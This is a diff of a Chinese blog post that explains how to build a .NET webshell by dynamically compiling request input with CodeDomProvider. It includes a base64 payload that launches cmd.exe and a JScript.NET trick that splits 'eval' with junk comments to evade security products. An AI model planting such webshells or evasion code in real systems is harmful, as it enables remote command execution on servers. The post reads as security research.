@@ -22,7 +22,7 @@ categories: .NET相关
 
 .Net可通过编译技术将外部输入的字符串作为代码执行，动态编译技术提供了最核心的两个类`CodeDomProvider` 和 `CompilerParameters`，前者相当于编译器，后者相当于编译器参数，CodeDomProvider支持多种语言（如C#、VB、Jscript），编译器参数CompilerParameters.GenerateExecutable默认表示生成dll，`GenerateInMemory= true`时表示在内存中加载，CompileAssemblyFromSource表示程序集的数据源，再将编译产生的结果生成程序集供反射调用。最后通过CreateInstance实例化对象并反射调用自定义类中的方法。
 
-```C#
+```csharp
 CodeDomProvider compiler = CodeDomProvider.CreateProvider("C#"); ;     //编译器
 CompilerParameters comPara = new CompilerParameters();   //编译器参数
 comPara.ReferencedAssemblies.Add("System.dll"); //添加引用
@@ -39,7 +39,7 @@ var result = objMifo.Invoke(objInstance, null);
 
 上述代码里的SourceText方法需提供编译的C#源代码，笔者创建了NeteyeInput类，如下
 
-```C#
+```csharp
 public static string SourceText(string txt)
 {
     StringBuilder sb = new StringBuilder();
@@ -77,7 +77,7 @@ U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiLCIvYyBjYWxjIik7
 
 最后在一般处理程序ProcessRequest方法中调用
 
-```C#
+```csharp
 public void ProcessRequest(HttpContext context)
 {
     context.Response.ContentType = "text/plain";
@@ -101,7 +101,7 @@ Jscript.Net 动态编译拆解eval
 
 在.NET安全领域中一句话木马主流的都是交给eval关键词执行，而很多安全产品都会对此重点查杀，所以笔者需要`避开eval`，而在.NET中eval只存在于Jscript.Net，所以需要将动态编译器指定为Jscript，其余和C#版本的动态编译基本一致，笔者通过插入无关字符将eval拆解掉，代码如下
 
-```C#
+```csharp
 private static readonly string _jscriptClassText =
         @"import System;
             class JScriptRun
@@ -115,7 +115,7 @@ private static readonly string _jscriptClassText =
 
 只需在编译的时候替换掉无关字符串“/*@Ivan1ee@*/”，最后编译后反射执行目标方法。
 
-```C#
+```csharp
 CompilerResults results = compiler.CompileAssemblyFromSource(parameters, _jscriptClassText.Replace("/*@Ivan1ee@*/",""));
 ```
 
